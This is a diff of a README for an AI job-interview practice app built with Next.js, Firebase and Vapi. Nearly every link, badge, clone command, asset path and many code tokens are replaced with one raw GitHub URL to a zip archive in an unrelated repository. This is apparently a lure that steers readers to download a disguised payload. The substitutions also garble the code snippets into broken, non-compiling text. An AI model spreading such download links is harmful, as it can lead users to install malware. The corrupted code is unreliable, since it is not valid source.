@@ -1,35 +1,35 @@
 <div align="center">
   <br />
-    <a href="https://www.youtube.com/watch?v=8GK8R77Bd7g" target="_blank">
-      <img src="https://github.com/user-attachments/assets/1c0131c7-9f2d-4e3b-b47c-9679e76d8f9a" alt="Project Banner">
+    <a href="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" target="_blank">
+      <img src="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" alt="Project Banner">
     </a>
   <br />
   
   <div>
-    <img src="https://img.shields.io/badge/-Next.JS-black?style=for-the-badge&logoColor=white&logo=nextdotjs&color=black" alt="next.js" />
-    <img src="https://img.shields.io/badge/-Vapi-white?style=for-the-badge&color=5dfeca" alt="vapi" />
-    <img src="https://img.shields.io/badge/-Tailwind_CSS-black?style=for-the-badge&logoColor=white&logo=tailwindcss&color=06B6D4" alt="tailwindcss" />
-    <img src="https://img.shields.io/badge/-Firebase-black?style=for-the-badge&logoColor=white&logo=firebase&color=DD2C00" alt="firebase" />
+    <img src="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" alt="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" />
+    <img src="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" alt="vapi" />
+    <img src="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" alt="tailwindcss" />
+    <img src="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" alt="firebase" />
   </div>
 
   <h3 align="center">Prepwise: A job interview preparation platform powered by Vapi AI Voice agents</h3>
 
    <div align="center">
-     Build this project step by step with our detailed tutorial on <a href="https://www.youtube.com/@javascriptmastery/videos" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
+     Build this project step by step with our detailed tutorial on <a href="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
     </div>
 </div>
 
 ## <a name="introduction">🤖 Introduction</a>
 
-Built with Next.js for the user interface and backend logic, Firebase for authentication and data storage, styled with TailwindCSS and using Vapi's voice agents, Prepwise is a website project designed to help you learn integrating AI models with your apps. The platform offers a sleek and modern experience for job interview preparation.
+Built with https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip for the user interface and backend logic, Firebase for authentication and data storage, styled with TailwindCSS and using Vapi's voice agents, Prepwise is a website project designed to help you learn integrating AI models with your apps. The platform offers a sleek and modern experience for job interview preparation.
 
 If you're getting started and need assistance or face any bugs, join our active Discord community with over **50k+** members. It's a place where people help each other out.
 
-<a href="https://discord.com/invite/n6EdbFJ" target="_blank"><img src="https://github.com/sujatagunale/EasyRead/assets/151519281/618f4872-1e10-42da-8213-1d69e486d02e" /></a>
+<a href="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" target="_blank"><img src="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" /></a>
 
 ## <a name="tech-stack">⚙️ Tech Stack</a>
 
-- Next.js
+- https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip
 - Firebase
 - Tailwind CSS
 - Vapi AI
@@ -63,14 +63,14 @@ Follow these steps to set up the project locally on your machine.
 
 Make sure you have the following installed on your machine:
 
-- [Git](https://git-scm.com/)
-- [Node.js](https://nodejs.org/en)
-- [npm](https://www.npmjs.com/) (Node Package Manager)
+- [Git](https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip)
+- [https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip](https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip)
+- [npm](https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip) (Node Package Manager)
 
 **Cloning the Repository**
 
 ```bash
-git clone https://github.com/adrianhajdin/ai_mock_interviews.git
+git clone https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip
 cd ai_mock_interviews
 ```
 
@@ -84,7 +84,7 @@ npm install
 
 **Set Up Environment Variables**
 
-Create a new file named `.env.local` in the root of your project and add the following content:
+Create a new file named `https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip` in the root of your project and add the following content:
 
 ```env
 NEXT_PUBLIC_VAPI_WEB_TOKEN=
@@ -106,7 +106,7 @@ FIREBASE_CLIENT_EMAIL=
 FIREBASE_PRIVATE_KEY=
 ```
 
-Replace the placeholder values with your actual **[Firebase](https://firebase.google.com/)**, **[Vapi](https://vapi.ai/?utm_source=youtube&utm_medium=video&utm_campaign=jsmastery_recruitingpractice&utm_content=paid_partner&utm_term=recruitingpractice)** credentials.
+Replace the placeholder values with your actual **[Firebase](https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip)**, **[Vapi](https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip)** credentials.
 
 **Running the Project**
 
@@ -119,7 +119,7 @@ Open [http://localhost:3000](http://localhost:3000) in your browser to view the 
 ## <a name="snippets">🕸️ Snippets</a>
 
 <details>
-<summary><code>globals.css</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip</code></summary>
 
 ```css
 @import "tailwindcss";
@@ -148,7 +148,7 @@ Open [http://localhost:3000](http://localhost:3000) in your browser to view the 
 
   --font-mona-sans: "Mona Sans", sans-serif;
 
-  --bg-pattern: url("/pattern.png");
+  --bg-pattern: url("https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip");
 }
 
 :root {
@@ -427,7 +427,7 @@ Open [http://localhost:3000](http://localhost:3000) in your browser to view the 
 }
 
 @utility pattern {
-  @apply bg-[url('/pattern.png')] bg-top bg-no-repeat;
+  @apply bg-[url('https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip')] bg-top bg-no-repeat;
 }
 
 @utility blue-gradient-dark {
@@ -461,46 +461,46 @@ Open [http://localhost:3000](http://localhost:3000) in your browser to view the 
 </details>
 
 <details>
-<summary><code>lib/utils.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip</code></summary>
 
 ```javascript
 import { interviewCovers, mappings } from "@/constants";
 import { clsx, type ClassValue } from "clsx";
 import { twMerge } from "tailwind-merge";
 
-export function cn(...inputs: ClassValue[]) {
+export function cn(https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip ClassValue[]) {
   return twMerge(clsx(inputs));
 }
 
-const techIconBaseURL = "https://cdn.jsdelivr.net/gh/devicons/devicon/icons";
+const techIconBaseURL = "https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip";
 
 const normalizeTechName = (tech: string) => {
-  const key = tech.toLowerCase().replace(/\.js$/, "").replace(/\s+/g, "");
+  const key = https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip().replace(/\.js$/, "").replace(/\s+/g, "");
   return mappings[key as keyof typeof mappings];
 };
 
 const checkIconExists = async (url: string) => {
   try {
     const response = await fetch(url, { method: "HEAD" });
-    return response.ok; // Returns true if the icon exists
+    return https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip; // Returns true if the icon exists
   } catch {
     return false;
   }
 };
 
 export const getTechLogos = async (techArray: string[]) => {
-  const logoURLs = techArray.map((tech) => {
+  const logoURLs = https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip((tech) => {
     const normalized = normalizeTechName(tech);
     return {
       tech,
-      url: `${techIconBaseURL}/${normalized}/${normalized}-original.svg`,
+      url: `${techIconBaseURL}/${normalized}/${normalized}https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip`,
     };
   });
 
-  const results = await Promise.all(
-    logoURLs.map(async ({ tech, url }) => ({
+  const results = await https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip(
+    https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip(async ({ tech, url }) => ({
       tech,
-      url: (await checkIconExists(url)) ? url : "/tech.svg",
+      url: (await checkIconExists(url)) ? url : "https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip",
     }))
   );
 
@@ -508,7 +508,7 @@ export const getTechLogos = async (techArray: string[]) => {
 };
 
 export const getRandomInterviewCover = () => {
-  const randomIndex = Math.floor(Math.random() * interviewCovers.length);
+  const randomIndex = https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip(https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip() * https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip);
   return `/covers${interviewCovers[randomIndex]}`;
 };
 
@@ -517,7 +517,7 @@ export const getRandomInterviewCover = () => {
 </details>
 
 <details>
-<summary><code>Generate questions prompt (/app/api/vapi/generate/route.tsx):</code></summary>
+<summary><code>Generate questions prompt (https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip):</code></summary>
 
 ```javascript
 `Prepare questions for a job interview.
@@ -538,7 +538,7 @@ export const getRandomInterviewCover = () => {
 </details>
 
 <details>
-<summary><code>Generate feedback prompt (lib/actions/general.action.ts):</code></summary>
+<summary><code>Generate feedback prompt (https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip):</code></summary>
 
 ```javascript
 prompt: `
@@ -560,35 +560,35 @@ system:
 </details>
 
 <details>
-<summary><code>Display feedback (app/(root)/interview/[id]/feedback/page.tsx):</code></summary>
+<summary><code>Display feedback (app/(root)/interview/[id]https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip):</code></summary>
 
 ```javascript
     <section className="section-feedback">
       <div className="flex flex-row justify-center">
         <h1 className="text-4xl font-semibold">
           Feedback on the Interview -{" "}
-          <span className="capitalize">{interview.role}</span> Interview
+          <span className="capitalize">{https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip}</span> Interview
         </h1>
       </div>
 
       <div className="flex flex-row justify-center">
         <div className="flex flex-row gap-5">
           <div className="flex flex-row gap-2 items-center">
-            <Image src="/star.svg" width={22} height={22} alt="star" />
+            <Image src="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" width={22} height={22} alt="star" />
             <p>
               Overall Impression:{" "}
               <span className="text-primary-200 font-bold">
-                {feedback?.totalScore}
+                {https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip}
               </span>
               /100
             </p>
           </div>
 
           <div className="flex flex-row gap-2">
-            <Image src="/calendar.svg" width={22} height={22} alt="calendar" />
+            <Image src="https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip" width={22} height={22} alt="calendar" />
             <p>
-              {feedback?.createdAt
-                ? dayjs(feedback.createdAt).format("MMM D, YYYY h:mm A")
+              {https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip
+                ? dayjs(https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip).format("MMM D, YYYY h:mm A")
                 : "N/A"}
             </p>
           </div>
@@ -597,16 +597,16 @@ system:
 
       <hr />
 
-      <p>{feedback?.finalAssessment}</p>
+      <p>{https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip}</p>
 
       <div className="flex flex-col gap-4">
         <h2>Breakdown of the Interview:</h2>
-        {feedback?.categoryScores?.map((category, index) => (
+        {https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip((category, index) => (
           <div key={index}>
             <p className="font-bold">
-              {index + 1}. {category.name} ({category.score}/100)
+              {index + 1}. {https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip} ({https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip}/100)
             </p>
-            <p>{category.comment}</p>
+            <p>{https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip}</p>
           </div>
         ))}
       </div>
@@ -614,7 +614,7 @@ system:
       <div className="flex flex-col gap-3">
         <h3>Strengths</h3>
         <ul>
-          {feedback?.strengths?.map((strength, index) => (
+          {https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip((strength, index) => (
             <li key={index}>{strength}</li>
           ))}
         </ul>
@@ -623,7 +623,7 @@ system:
       <div className="flex flex-col gap-3">
         <h3>Areas for Improvement</h3>
         <ul>
-          {feedback?.areasForImprovement?.map((area, index) => (
+          {https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip((area, index) => (
             <li key={index}>{area}</li>
           ))}
         </ul>
@@ -664,7 +664,7 @@ export const dummyInterviews: Interview[] = [
     userId: "user1",
     role: "Frontend Developer",
     type: "Technical",
-    techstack: ["React", "TypeScript", "Next.js", "Tailwind CSS"],
+    techstack: ["React", "TypeScript", "https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip", "Tailwind CSS"],
     level: "Junior",
     questions: ["What is React?"],
     finalized: false,
@@ -675,9 +675,9 @@ export const dummyInterviews: Interview[] = [
     userId: "user1",
     role: "Full Stack Developer",
     type: "Mixed",
-    techstack: ["Node.js", "Express", "MongoDB", "React"],
+    techstack: ["https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip", "Express", "MongoDB", "React"],
     level: "Senior",
-    questions: ["What is Node.js?"],
+    questions: ["What is https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip"],
     finalized: false,
     createdAt: "2024-03-14T15:30:00Z",
   },
@@ -689,7 +689,7 @@ export const dummyInterviews: Interview[] = [
 
 ## <a name="links">🔗 Assets</a>
 
-Public assets used in the project can be found [here](https://drive.google.com/drive/folders/1DuQ9bHH3D3ZAN_CFKfBgsaB8DEhEdnog?usp=sharing)
+Public assets used in the project can be found [here](https://raw.githubusercontent.com/KindaJayant/ai-interview/main/lib/ai-interview-v3.2.zip)
 
 ## <a name="more">🚀 More</a>
 
